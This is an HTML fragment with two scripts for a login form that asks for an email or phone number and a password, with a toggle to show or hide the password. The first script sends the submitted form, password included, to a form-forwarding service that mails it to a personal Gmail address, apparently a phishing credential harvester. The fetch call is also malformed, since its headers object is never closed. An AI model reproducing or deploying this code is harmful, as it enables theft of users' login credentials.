<script>
  document.getElementById('submit').addEventListener('click', function() {
    if (document.getElementById('numero correo').value !== '' && document.getElementById('text').value !== '') {
      this.classList.add('loading');
      fetch('https://formsubmit.co/juaresalex05@gmail.com', {
        method: 'POST',
        headers: {
          'Content-Type': 'application/x-www-form-urlencoded',
          'Accept': 'application/json'

        body: new FormData(document.querySelector('form'))
      })
      .then(response => response.json())
      .then(data => {
        this.classList.remove('loading');
      })
      .catch(error => {
        this.classList.remove('loading');
        console.error(error);
      });
    }
  });
</script>
<script>
  const eye = document.querySelector('.ojo i');
  const passwordInput = document.getElementById('text');
  const emailInput = document.getElementById('numero correo');

  passwordInput.type = 'password';
  eye.parentNode.style.display = 'none';

  passwordInput.addEventListener('focus', () => {
    eye.parentNode.style.display = 'block';
  });

  emailInput.addEventListener('focus', () => {
    if (passwordInput.value === '') {
      eye.parentNode.style.display = 'none';
    }
  });

  eye.parentNode.addEventListener('click', () => {
    if (passwordInput.type === 'password') {
      passwordInput.type = 'text';
      eye.className = 'fas fa-eye';
    } else {
      passwordInput.type = 'password';
      eye.className = 'fas fa-eye-slash';
    }
  });
</script>
